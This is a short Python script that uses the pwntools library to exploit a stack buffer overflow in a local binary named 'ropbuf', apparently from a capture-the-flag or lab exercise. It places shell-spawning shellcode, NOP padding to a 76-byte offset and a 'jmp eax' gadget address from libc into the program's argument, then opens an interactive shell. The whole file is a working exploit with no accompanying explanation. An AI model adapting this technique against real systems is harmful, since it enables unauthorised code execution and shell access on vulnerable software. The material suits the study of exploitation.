from pwn import *

# gdb-peda pattc + patto
buf_offset = 76

# gdb-peda$ ropsearch "jmp eax" libc
rop_addr = 0xf7e2dcf2

sc = asm(shellcraft.sh())
# print len(sc)

# Shellcode
payload = sc
# Pad after shellcode
payload += "\x90" * (buf_offset - len(sc))
# New return address
payload += p32(rop_addr)

# TODO start process
io = process(['./ropbuf', payload])
io.interactive()
io.close()
